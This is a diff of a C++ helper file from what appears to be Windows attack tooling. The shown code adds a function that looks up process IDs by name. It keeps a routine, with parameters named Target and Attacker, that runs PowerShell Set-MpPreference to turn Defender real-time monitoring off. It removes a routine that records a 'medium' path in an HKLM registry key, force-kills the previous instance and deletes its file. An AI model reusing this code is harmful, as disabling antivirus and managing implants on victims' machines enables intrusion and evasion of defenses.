@@ -1,6 +1,25 @@
 #include "helpers.h"
 
 
+std::uint32_t GetPID(std::string PrcName) {
+    PROCESSENTRY32 PrcEntry;
+    const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
+    if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
+        return NULL; // invalid handle
+    }
+    PrcEntry.dwSize = sizeof(PROCESSENTRY32);  // set size of function process entry (after validating the given handle)
+    while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
+        std::wstring wideExeFile(PrcEntry.szExeFile);
+        std::string narrowExeFile(wideExeFile.begin(), wideExeFile.end());
+
+        if (strcmp(PrcName.c_str(), narrowExeFile.c_str()) == 0) {
+            return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
+        }
+    }
+    return NULL;  // if something did not work correctly
+}
+
+
 DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr) {
     DWORD Score = 0;
     DWORD LocalInd = 0;
@@ -116,17 +135,7 @@ BOOL GetAddresses(char* Target, char* Attacker, const char* AttackAddresses) {
 }
 
 
-DWORD SpecialQuit(DWORD LastError, const char* StatusName, HANDLE CloseArr[], DWORD CloseSize, LogFile* CurrLog) {
-    CurrLog->WriteError(StatusName, LastError);
-    for (int i = 0; i < (int)CloseSize; i++) {
-        CloseHandle(CloseArr[i]);
-    }
-    CurrLog->CloseLog();
-    return LastError;
-}
-
-
-RETURN_LAST RealTime(BOOL IsDisable, LogFile* LogToWrite) {
+RETURN_LAST RealTime(BOOL IsDisable) {
     RETURN_LAST LastError = { 0, ERROR_SUCCESS };
     const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
     const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\"";
@@ -140,97 +149,8 @@ RETURN_LAST RealTime(BOOL IsDisable, LogFile* LogToWrite) {
     if (LastError.LastError == -1) {
         LastError.LastError = GetLastError();
         LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
-        if (IsDisable) {
-            SpecialQuit(LastError.LastError, "[-] Failed to disable RealTime Protection - ", NULL, 0, LogToWrite);
-        }
-        else {
-            SpecialQuit(LastError.LastError, "[-] Failed to enable RealTime Protection - ", NULL, 0, LogToWrite);
-        }
         return LastError;
     }
     LastError.LastError = 0;
-    if (IsDisable) {
-        LogToWrite->WriteLog((PVOID)"[+] Disabled RealTime Protection!\n", 35);
-    }
-    else {
-        LogToWrite->WriteLog((PVOID)"[+] Enabled RealTime Protection!\n", 34);
-    }
     return LastError;
-}
-
-
-BOOL DeletePrevious(char* CurrentPath, LogFile* CurrLog) {
-    HKEY RegistryHandle = HKEY_LOCAL_MACHINE;
-    char LastPath[500] = { 0 };
-    char KillLast[20] = { 0 };
-    char LastName[MAX_PATH] = { 0 };
-    DWORD LastType = REG_SZ;
-    DWORD LastSize = 500;
-    DWORD LastErr = 0;
-
-    std::string RegistryKey("Software\\Microsoft\\Temp");
-    LSTATUS Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
-    if (Result != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-
-    // Get existing/nonexisting value of CurrMedium (last path) -
-    Result = RegGetValueA(RegistryHandle, NULL, "CurrMedium", RRF_RT_REG_SZ, &LastType, LastPath, &LastSize);
-    if (Result != ERROR_SUCCESS && Result != ERROR_FILE_NOT_FOUND) {
-        RegDeleteKeyA(RegistryHandle, NULL);
-        RegCloseKey(RegistryHandle);
-        return FALSE;
-    }
-
-    if (Result != ERROR_FILE_NOT_FOUND) {
-        // Get process name of medium and kill it -
-        GetServiceName(LastPath, LastName);
-        REPLACEMENT Rep = { LastName, '*', 1 };
-        REPLACEMENT RepArr[1] = { Rep };
-        LastErr = ExecuteSystem("taskkill /IM \"*\" /F", RepArr, 1);
-        if (LastErr != 0) {
-            RegDeleteKeyA(RegistryHandle, NULL);
-            RegCloseKey(RegistryHandle);
-            CurrLog->WriteError("[-] Could not terminate last medium - ", LastErr);
-            return FALSE;
-        }
-
-
-        // delete the last medium file from temp -
-        if (!DeleteFileA(LastPath)) {
-            RegDeleteKeyA(RegistryHandle, NULL);
-            RegCloseKey(RegistryHandle);
-            LastErr = GetLastError();
-            if (!(LastErr == ERROR_FILE_NOT_FOUND || LastErr == ERROR_PATH_NOT_FOUND || LastErr == ERROR_ACCESS_DENIED)) {
-                CurrLog->WriteError("[-] Could not delete last medium file - ", GetLastError());
-                return FALSE;
-            }
-        }
-    }
-
-
-    // Set value for new path of medium -
-    Result = RegSetValueExA(RegistryHandle, "CurrMedium", 0, REG_SZ, (BYTE*)CurrentPath, (int)strlen(CurrentPath) + 1);
-    while (Result != ERROR_SUCCESS) {
-        RegDeleteKeyA(RegistryHandle, NULL);
-        RegCloseKey(RegistryHandle);
-        CurrLog->WriteError("[-] Could not set the value of CurrMedium to the current path - ", Result);
-        Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
-        while (Result != ERROR_SUCCESS) {
-            Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
-        }
-        Result = RegSetValueExA(RegistryHandle, "CurrMedium", 0, REG_SZ, (BYTE*)CurrentPath, (int)strlen(CurrentPath) + 1);
-    }
-    /*
-    if (Result != ERROR_SUCCESS) {
-        RegDeleteKeyA(RegistryHandle, NULL);
-        RegCloseKey(RegistryHandle);
-        CurrLog->WriteError("[-] Could not set the value of CurrMedium to the current path - ", Result);
-        return FALSE;
-    }
-    */
-    RegCloseKey(RegistryHandle);
-    CurrLog->WriteLog((PVOID)"[+] Success in deleting last medium, stopping its execution and cleaning!\n", 75);
-    return TRUE;
 }
